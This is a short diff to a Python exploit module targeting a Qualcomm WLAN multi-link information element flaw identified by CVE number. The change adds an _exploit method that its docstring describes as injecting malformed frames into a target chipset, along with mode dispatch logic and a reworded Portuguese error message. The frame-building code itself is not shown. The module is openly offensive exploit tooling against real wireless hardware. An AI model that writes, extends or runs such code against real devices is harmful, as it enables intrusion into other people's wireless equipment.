@@ -136,6 +136,12 @@ class QualcommWlanMlIeCve202445569(Exploit):
         if not gw.run():
             return
 
+        print("[+] Pre-conditions satisfied; launching exploit ...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploitation: inject malformed ML IE frames into target Qualcomm chipset."""
+        orch = PolyglotOrchestrator()
         mode = str(self.MODE.value).lower().strip()
         dispatch = {
             "info":           self._mode_info,
@@ -145,7 +151,7 @@ class QualcommWlanMlIeCve202445569(Exploit):
         }
 
         if mode not in dispatch:
-            print(f"[!] Modo desconhecido: {mode!r}  —  {', '.join(dispatch)}")
+            print(f"[!] Modo desconhecido: {mode!r}; validos: {', '.join(dispatch)}")
             return
 
         dispatch[mode]()
